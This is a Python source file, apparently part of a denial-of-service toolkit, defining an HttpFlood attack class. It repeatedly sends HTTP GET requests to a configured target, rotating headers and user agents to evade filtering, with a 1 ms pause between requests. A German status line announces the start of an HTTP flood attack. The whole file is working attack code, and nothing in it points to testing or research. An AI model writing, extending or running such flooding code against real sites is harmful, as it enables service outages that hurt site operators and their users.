import asyncio
import random
from src.attacks.base import AttackBase
import aiohttp

class HttpFlood(AttackBase):
    async def setup(self):
        await super().setup()
        self.session = aiohttp.ClientSession()
    
    async def cleanup(self):
        await self.session.close()
        await super().cleanup()
    
    async def attack_loop(self):
        print("Starte HTTP-Flood Angriff...")
        while not self.stop_event.is_set():
            try:
                headers = random.choice(self.config.http_headers)
                headers["User-Agent"] = random.choice(self.config.user_agents)
                async with self.session.get(f"http://{self.config.target}", headers=headers, timeout=self.config.timeout) as response:
                    self.stats.add_status_code(response.status)
                    await response.text()
                self.stats.update_sent(1, self.config.packet_size)
            except Exception as e:
                self.stats.update_connections(False)
            await asyncio.sleep(0.001)
